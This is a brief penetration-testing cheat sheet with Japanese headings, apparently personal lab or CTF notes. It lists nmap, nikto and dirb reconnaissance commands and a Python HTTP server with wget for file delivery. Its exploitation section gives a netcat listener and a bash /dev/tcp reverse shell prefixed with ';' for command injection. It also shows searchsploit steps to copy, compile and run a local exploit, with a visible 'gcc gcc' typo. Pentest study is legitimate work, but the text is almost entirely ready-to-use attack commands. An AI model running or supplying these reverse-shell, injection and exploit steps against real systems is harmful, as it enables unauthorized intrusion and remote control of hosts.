
## Reconnaissance

ホスト確認

    nmap -sn [address]/24

ポート確認

    nmap -v -p 1-65535 -sV -sT -Pn [HOST]
    nmap -v -A [HOST]

Webサーバ

    nikto -h [HOST]
    dirb http://XXX.com/

状態確認

    uname -a
    cat /etc/redhat-release
    cat /proc/version

## Delivery

http転送

    python -m SimpleHTTPServer 9998
    wget http://address:9998/file


## Exploitation

bashリバースシェル http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

    nc -lvp 9999
    ;bash -i >& /dev/tcp/ip/9999 0>&1

exploitdb https://github.com/offensive-security/exploitdb

    searchsploit CentOS 4.0
    cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
    gcc gcc XXX.c -o test
    ./test


